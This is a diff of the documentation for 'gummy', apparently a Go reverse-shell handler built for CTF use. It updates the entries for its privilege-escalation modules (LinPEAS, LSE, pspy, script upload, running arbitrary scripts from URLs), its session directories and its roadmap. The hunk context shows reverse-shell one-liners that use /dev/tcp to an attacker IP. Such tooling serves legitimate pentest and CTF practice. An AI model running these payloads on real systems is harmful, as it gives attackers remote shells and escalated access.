@@ -135,13 +135,24 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Graceful handling of dead sessions
 - [x] **Module System** (`internal/modules.go`) 🆕
   - Module interface and registry (singleton pattern)
-  - Built-in `enum` module - Basic system enumeration
-  - Built-in `lse` module - Linux Smart Enumeration
+  - Explicit category ordering: Linux, Windows, Misc, Custom
   - Commands: `modules` (list), `run <module> [args]` (execute)
-  - Category-based organization
-  - Automatic script download, upload, and execution
+  - **Linux Modules:**
+    - `peas` - LinPEAS privilege escalation scanner
+    - `lse` - Linux Smart Enumeration (chsoares fork)
+    - `pspy` - Process monitoring without root (pspy64)
+  - **Misc Modules:**
+    - `privesc` - Bulk upload privesc scripts (platform-aware)
+  - **Custom Modules:**
+    - `sh <url>` - Run arbitrary shell scripts from URLs
+  - RunScript() for shell scripts (bash execution)
+  - RunBinary() for executables (chmod +x, direct execution)
+  - Timeout support for long-running binaries (5min default)
+  - Real-time output streaming to separate terminals
+  - Automatic cleanup with shred (secure deletion)
 - [x] **Session Directories** 🆕
-  - Format: `~/.gummy/YYYY_MM_DD/ID_IP_user_hostname/`
+  - Format: `~/.gummy/YYYY_MM_DD/IP_user_hostname/` (shared per host)
+  - Lazy creation (only when needed by modules)
   - Auto-created `scripts/` and `logs/` subdirectories
   - Path sanitization for special characters
   - Timestamps for all module outputs
@@ -155,13 +166,13 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Falls back to traditional terminals
   - Auto-detects available terminal emulator
 
-### 📋 TODO (Phase 4 - Additional Features)
+### 📋 TODO (Phase 4 - Additional Features) - See TODO.md for details
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
-- [ ] **PEAS Module** - LinPEAS/WinPEAS with streaming output
 - [ ] **Session Logging** - Automatic logging of all session I/O to `logs/` directory
+- [ ] **Windows Modules** - WinPEAS, PowerUp, PrivescCheck integration
+- [ ] **Additional Linux Modules** - See TODO.md for suggestions
 - [ ] Port forwarding (local/remote) - NOT PRIORITY (use ligolo)
 - [ ] Auto-reconnect capability
-- [ ] WinRM support (Windows automation)
 
 ## Project Structure
 
@@ -744,9 +755,9 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 ## Progress Tracking
 
 **Last updated:** 2025-10-16
-**Current focus:** Module System complete! 🎉
-**Next milestone:** PEAS module with streaming output or Session logging
-**Lines of code:** ~3,748 LOC (3,103 core + 490 UI + 155 main)
+**Current focus:** Module System with Linux tooling complete! 🎉
+**Next milestone:** Windows modules or Session logging (see TODO.md)
+**Lines of code:** ~4,100 LOC (3,500 core + 490 UI + 110 modules)
 **Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
 **Status:** Production-ready for CTF use! ✅
 
@@ -756,7 +767,9 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 - ✅ **UI/UX** - Lipgloss styling, Bubble Tea confirmations, animated spinners
 - ✅ **Automation** - SSH integration, payload generation, shell spawning
 - ✅ **Reliability** - Session monitoring, buffer draining, graceful error handling
-- ✅ **Module System** - Extensible module system with enum and LSE modules
+- ✅ **Module System** - Extensible with 5 Linux modules (peas, lse, pspy, privesc, sh)
+- ⏳ **Windows modules** - URLs defined, modules not yet implemented
+- ⏳ **Session logging** - Directory structure ready, logging not implemented
 
 ### Command Reference
 ```
@@ -777,7 +790,11 @@ download <remote> [local]    - Download file (ESC to cancel)
 
 # Modules
 modules                      - List available modules
-run <module> [args]          - Run module (e.g., run enum, run lse -l2)
+run peas                     - Run LinPEAS privilege escalation scanner
+run lse [-l1|-l2]            - Run Linux Smart Enumeration (default: -l1)
+run pspy                     - Monitor processes without root (5min timeout)
+run privesc                  - Upload multiple privesc scripts (platform-aware)
+run sh <url> [args]          - Run arbitrary shell script from URL
 
 # Utility
 help                         - Show command reference
